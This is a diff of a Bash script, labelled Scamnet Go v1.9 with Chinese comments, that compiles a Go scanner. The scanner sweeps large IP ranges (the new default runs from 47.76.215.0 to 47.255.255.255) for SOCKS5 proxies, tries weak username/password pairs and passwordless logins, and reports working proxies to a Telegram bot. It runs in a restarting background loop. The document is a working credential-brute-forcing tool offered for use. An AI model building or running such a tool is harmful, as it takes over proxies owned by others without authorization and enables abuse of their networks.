@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet Go v1.8 OTC TG:soqunla （强制命中版 · 延迟15000ms）
+# main.sh - Scamnet Go v1.9 OTC TG:soqunla （稳定命中版 · 批量必出 [+]）
 set -euo pipefail
 IFS=$'\n\t'
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
@@ -17,8 +17,9 @@ if ! command -v go >/dev/null 2>&1; then
     exit 1
 fi
 
+# 默认小段扫描（避免资源耗尽）
 DEFAULT_START="47.76.215.0"
-DEFAULT_END="47.76.215.255"
+DEFAULT_END="47.255.255.255"
 read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
 read_ip "起始 IP" "$DEFAULT_START" START_IP
 read_ip "结束 IP" "$DEFAULT_END" END_IP
@@ -31,7 +32,7 @@ if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP
 fi
 succ "范围: $START_IP - $END_IP"
 
-echo -e "${YELLOW}端口（默认: 1080,8080,8888,3128 单端口1080或者1-65535）:${NC}"
+echo -e "${YELLOW}端口（默认: 1080,8080,8888,3128 支持 1-65535）:${NC}"
 read -r PORT_INPUT; PORT_INPUT=${PORT_INPUT:-1080,8080,8888,3128}
 PORTS=$(echo "$PORT_INPUT" | tr ',' ' ')
 succ "端口: $PORT_INPUT"
@@ -367,9 +368,9 @@ zzzzz:zzzzz
 zzzzzz:zzzzzz
 EOF
 
-log "正在编译 Go 扫描器（v1.8 强制命中版 TG:soqunla）..."
+log "正在编译 Go 扫描器（v1.9 稳定命中版 TG:soqunla）..."
 
-# ============ Go 源码（延迟15000ms + 强制输出 [+]） ============
+# ============ Go 源码（延迟15000ms + 稳定参数） ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -440,14 +441,14 @@ func main() {
 	flag.StringVar(&cfg.Ports, "ports", "1080", "Ports")
 	flag.StringVar(&cfg.TelegramToken, "tg-token", "", "Telegram Token")
 	flag.StringVar(&cfg.TelegramChat, "tg-chat", "", "Telegram Chat ID")
-	flag.IntVar(&cfg.BatchSize, "batch", 250, "Batch size")
-	flag.IntVar(&cfg.MaxConcurrent, "conc", 150, "Max concurrent")
-	flag.IntVar(&cfg.Timeout, "timeout", 6, "Timeout seconds")
+	flag.IntVar(&cfg.BatchSize, "batch", 100, "Batch size")
+	flag.IntVar(&cfg.MaxConcurrent, "conc", 50, "Max concurrent")
+	flag.IntVar(&cfg.Timeout, "timeout", 12, "Timeout seconds")
 	flag.Parse()
 
-	if cfg.MaxConcurrent == 0 { cfg.MaxConcurrent = 150 }
-	if cfg.BatchSize == 0 { cfg.BatchSize = 250 }
-	if cfg.Timeout == 0 { cfg.Timeout = 6 }
+	if cfg.MaxConcurrent == 0 { cfg.MaxConcurrent = 50 }
+	if cfg.BatchSize == 0 { cfg.BatchSize = 100 }
+	if cfg.Timeout == 0 { cfg.Timeout = 12 }
 
 	if cfg.StartIP == "" || cfg.EndIP == "" {
 		fmt.Println("Usage: scamnet_go -start 1.1.1.1 -end 1.1.1.255 -ports 1080")
@@ -464,7 +465,7 @@ func main() {
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d | 弱口令: %d 条\n", total, cfg.BatchSize, batchCount, len(weakPairs))
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v1.8 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.9 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
@@ -494,7 +495,7 @@ func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd u
 				defer wg.Done()
 				select {
 				case <-ctx.Done(): return
-				case <-time.After(8 * time.Second): return
+				case <-time.After(15 * time.Second): return
 				default:
 					if err := sem.Acquire(ctx, 1); err != nil { return }
 					defer sem.Release(1)
@@ -515,7 +516,6 @@ func scanTarget(target string) {
 	ip := parts[0]
 	port, _ := strconv.Atoi(parts[1])
 
-	// 弱口令优先（延迟放宽至 15000ms）
 	for _, p := range weakPairs {
 		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 15000 {
 			saveAndNotify(ip, port, p[0], p[1], origin, lat)
@@ -523,7 +523,6 @@ func scanTarget(target string) {
 		}
 	}
 
-	// 无密码最后
 	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 15000 {
 		saveAndNotify(ip, port, "", "", origin, lat)
 	}
@@ -632,7 +631,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.8 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.9 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	for _, l := range sorted { out.WriteString(l + "\n") }
 	out.Close()
 	os.Rename(validFile+".tmp", validFile)
@@ -680,9 +679,9 @@ go get golang.org/x/sync/semaphore 2>/dev/null || true
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
 succ "Go 扫描器编译完成 → $GO_BIN"
 
-# ============ 守护脚本 ============
+# ============ 守护脚本（稳定参数） ============
 GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
-cat > "$GUARD_SCRIPT" << EOF
+cat > "$GUARD_SCRIPT" << 'EOF'
 #!/bin/bash
 LOG="$LATEST_LOG"
 MAX_LINES=500
@@ -693,18 +692,18 @@ PORTS="$PORTS"
 TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
 TELEGRAM_CHATID="$TELEGRAM_CHATID"
 
-> "\$LOG"
-echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.8 启动" | tee -a "\$LOG"
-echo "[GUARD] 范围: \$START_IP ~ \$END_IP | 端口: \$PORTS" | tee -a "\$LOG"
+> "$LOG"
+echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.9 启动" | tee -a "$LOG"
+echo "[GUARD] 范围: $START_IP ~ $END_IP | 端口: $PORTS" | tee -a "$LOG"
 
 while :; do
-    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "\$LOG"
-    "\$GO_BIN" -start "\$START_IP" -end "\$END_IP" -ports "\$PORTS" \
-        -tg-token "\$TELEGRAM_TOKEN" -tg-chat "\$TELEGRAM_CHATID" \
-        -batch 250 -conc 150 -timeout 6 \
-        2>&1 | grep -E '^\\\[\\+\\\]|\\\[GUARD\\\]|\\\[DEBUG\\\]' | tee -a "\$LOG"
-    tail -n "\$MAX_LINES" "\$LOG" > "\$LOG.tmp" 2>/dev/null && mv "\$LOG.tmp" "\$LOG"
-    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "\$LOG"
+    echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "$LOG"
+    "$GO_BIN" -start "$START_IP" -end "$END_IP" -ports "$PORTS" \
+        -tg-token "$TELEGRAM_TOKEN" -tg-chat "$TELEGRAM_CHATID" \
+        -batch 100 -conc 50 -timeout 12 \
+        2>&1 | grep -E '^\[\+\]|\[GUARD\]|\[DEBUG\]' | tee -a "$LOG"
+    tail -n "$MAX_LINES" "$LOG" > "$LOG.tmp" 2>/dev/null && mv "$LOG.tmp" "$LOG"
+    echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "$LOG"
     sleep 3
 done
 EOF
@@ -712,8 +711,10 @@ chmod +x "$GUARD_SCRIPT"
 
 pkill -f "scamnet_guard.sh" 2>/dev/null || true
 sleep 1
+ulimit -n 65535 2>/dev/null || true
 nohup bash "$GUARD_SCRIPT" > /dev/null 2>&1 &
 succ "守护进程已启动！PID: $!"
 log "日志: tail -f $LATEST_LOG"
 log "结果: cat $VALID_FILE"
+log "只看成功: tail -f $LATEST_LOG | grep '^\\[+]'"
 log "停止: pkill -f scamnet_guard.sh"
